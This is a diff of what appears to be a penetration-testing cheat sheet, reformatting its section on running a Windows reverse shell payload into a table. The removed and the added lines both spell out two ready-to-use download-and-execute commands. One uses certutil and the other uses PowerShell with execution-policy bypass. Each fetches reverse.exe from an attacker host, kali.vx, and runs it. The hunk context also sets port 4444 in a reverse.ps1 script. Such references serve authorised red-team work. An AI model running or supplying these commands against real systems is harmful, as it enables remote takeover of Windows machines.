@@ -60,17 +60,10 @@ sed -i 's/<PORT>/4444/' reverse.ps1
 
 ## 2.1. Execute Windows reverse shell TCP payload
 
-### Using certutil
-
-```console
-certutil.exe /urlcache /f /split http://kali.vx/reverse.exe %TEMP%\reverse.exe && %TEMP%\reverse.exe
-```
-
-### Using PowerShell
-
-```console
-powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://kali.vx/reverse.exe','%TEMP%\reverse.exe'); Start-Process %TEMP%\reverse.exe
-```
+|   |   |
+|---|---|
+|certutil|`certutil.exe /urlcache /f /split http://kali.vx/reverse.exe %TEMP%\reverse.exe && %TEMP%\reverse.exe`|
+|PowerShell|`powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://kali.vx/reverse.exe','%TEMP%\reverse.exe'); Start-Process %TEMP%\reverse.exe`|
 
 ## 2.2. Execute PowerShell-based reverse shell script
 
